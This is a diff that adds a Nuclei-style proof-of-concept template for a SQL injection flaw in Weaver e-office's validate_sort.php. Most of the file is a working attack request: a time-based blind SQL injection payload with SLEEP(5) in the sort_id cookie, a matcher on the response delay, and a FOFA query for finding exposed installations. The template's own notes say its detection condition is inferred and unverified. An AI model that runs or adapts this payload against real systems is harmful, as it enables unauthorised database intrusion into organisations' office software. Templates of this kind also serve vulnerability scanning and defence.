@@ -1,0 +1,28 @@
+id: poc-plp84dgbzfkrzax5
+info:
+  name: 泛微e-office validate_sort存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/plp84dgbzfkrzax5
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: plp84dgbzfkrzax5
+    fofa: app="泛微-EOffice"
+http:
+- raw:
+  - 'GET /general/officeitem/sort/validate_sort.php HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Cookie: sort_id=1 AND (SELECT 4110 FROM (SELECT(SLEEP(5)))Cfzo)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
